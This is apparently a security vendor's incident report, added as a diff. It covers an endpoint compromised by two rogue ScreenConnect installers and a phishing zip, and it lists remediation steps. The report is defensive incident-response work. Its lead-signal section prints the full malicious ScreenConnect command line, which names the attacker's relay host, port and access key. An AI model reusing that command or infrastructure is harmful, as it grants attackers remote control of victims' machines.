@@ -1,0 +1,49 @@
+Investigative Summary:
+----------------------
+Huntress has investigated threat signals from endpoint ATN80575. Due to the nature of these signals, the endpoint has been isolated.
+
+Evidence suggests at 2026-01-07 12:24:48 UTC, a ScreenConnect instance was installed from file 'C:\WINDOWS\temp\60fa5808-6d54-4942-b2f1-8fbb794573fa.exe' via Faronics Update Helper. This ScreenConnect instance communicates with domain 'waynemfgtool[.]com'. 
+
+Following this activity, at 2026-01-07 12:26:34 UTC a second ScreenConnect instance was installed from file 'C:\WINDOWS\temp\962c1f32-6a2d-4515-a2cb-cfb713c9adfa.exe' via Faronics Update Helper. This ScreenConnect instance communicates with domain 'haskba[.]top'. 
+
+At 2026-01-07 12:58:51 UTC, user 'ATN80575\Edward' (S-1-5-21-3610995793-4011907259-2442990371-1002) downloaded file 'Payment_Confirmation.pdf.zip' which when opened attempts to establish a connection to CloudFlare domain 'hxxps[://]capability-riding-implemented-teacher[.]trycloudflare[.]com/'. 
+
+Huntress highly recommends auditing this endpoint for any rogue remote management tools. 
+
+Threat Descriptions:
+--------------------
+Rogue ScreenConnect: Huntress has been tracking a number of malicious threat actors convincing users via email into running malicious ScreenConnect (ConnectWise Control) installers that give the threat actor remote access to the host. 
+
+Malicious Downloader / Malicious Download: Malicious activity has resulted in the download and execution of an additional malicious payload(s). 
+
+Remediations:
+-------------
+Assisted Remediations provided by the Huntress SOC to remediate the incident. These can be executed automatically in the Huntress Platform:
+- Kill Process - path: C:\Program Files (x86)\ScreenConnect Client (7d793ed7771125f7)\ScreenConnect.ClientService.exe + pid: 41764
+- Kill Process - path: C:\Program Files (x86)\ScreenConnect Client (0b0e581788f3d14c)\ScreenConnect.ClientService.exe + pid: 26312
+- Delete Service - name: ScreenConnect Client (7d793ed7771125f7)
+- Delete Service - name: FWASvc
+- Delete Service - name: USEngine
+- Delete Service - name: FWUSvc
+- Delete Scheduled Task - name: FWASvcHelperMonitortask
+- Delete Registry Value - key: HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run + value: FaronicsTicketing
+- Delete Registry Key - key: HKLM\SYSTEM\CurrentControlSet\Services\FWASvc
+- Delete Registry Key - key: HKLM\SYSTEM\CurrentControlSet\Services\FWUSvc
+- + 53 more
+
+Manual Remediations provided by the Huntress SOC are highly recommended remediation actions to be conducted by your team before resolving the incident in the Huntress Platform:
+- Enroll the user in a security awareness training session to reinforce safe practices in the corporate environment.
+- Audit affected directories/files for additional suspicious files and remove those found. 
+
+All remediations provided can be found in the Huntress Platform: Incident Report: https://tabinc.huntress.io/org/260452/infection_reports/1871046#remediations-tab
+
+Lead Signal Information:
+------------------------
+Signal Name: Known Malicious Screen Connect
+Detected At: 2026-01-07 12:31:39 UTC
+Start Time: 2026-01-07 12:26:37 UTC
+Command: "C:\Program Files (x86)\ScreenConnect Client (7d793ed7771125f7)\ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=haskba.top&p=8041&s=3c959e56-aa26-4e30-92ce-d718b273b29e&k=BgIAAACkAABSU0ExAAgAAAEAAQAFW6y3S4jfO2pstpH%2fsPD69bdSIFWBjXW9zM39SmKUCvIZmqvX0yfdUsOz%2fpWBKRnnHYMi2icyqabxmHG5rEI%2fcInPBRyBSOvLmbF9W2u5G%2f2H5rlz8LmJMH5keHJCnnm7rIUJhX1cOLQgGlWtsLNaXS7adRIpyDBKf6dk2oa1s2DrTb02Wztn8byv26MFoKDl1nVFYwA%2bmCD6THmLPf49LSKZC1iVRUxkt1sC3spaZEIASUaVWf7s%2bfsF5IIp9fZHGK%2bI7Fx6DPVyTDyZFjKbvtMXcJObVkeFMNF580LMZlcRBgHx6y0l2KxcznpZ6gIFJMDPtSY5DUuyv767FfLV"
+Executable: C:\Program Files (x86)\ScreenConnect Client (7d793ed7771125f7)\ScreenConnect.ClientService.exe
+Process ID: 71a27956-eb33-11f0-aaf8-f4390915087e
+Parent Process: C:\Windows\System32\services.exe
+User: SYSTEM
